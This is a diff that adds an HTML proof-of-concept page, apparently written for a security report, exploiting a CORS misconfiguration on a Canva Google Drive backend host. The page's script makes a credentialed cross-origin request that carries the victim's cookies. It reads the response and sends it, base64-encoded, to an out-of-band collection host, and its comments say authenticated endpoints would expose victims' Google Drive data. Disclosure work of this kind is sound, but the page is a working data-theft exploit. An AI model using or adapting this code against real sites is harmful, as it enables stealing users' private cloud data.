@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+  <script>
+  // Victim with Google Drive connected to Canva visits attacker.com
+  fetch('https://google-drive-backend.canva-apps.com/health', {
+    credentials: 'include'  // sends victim's canva-apps.com cookies
+  })
+  .then(r => r.text())
+  .then(data => {
+    // Response IS readable — ACAO reflects attacker.com
+    // data = "OK" ← confirmed readable
+    // With authenticated endpoints, this reads victim's Google Drive data
+    new Image().src = 'https://qlzreinvfwntieknybueyru1gp7hupknv.oast.fun/collect?d=' + btoa(data);
+  });
+  </script>
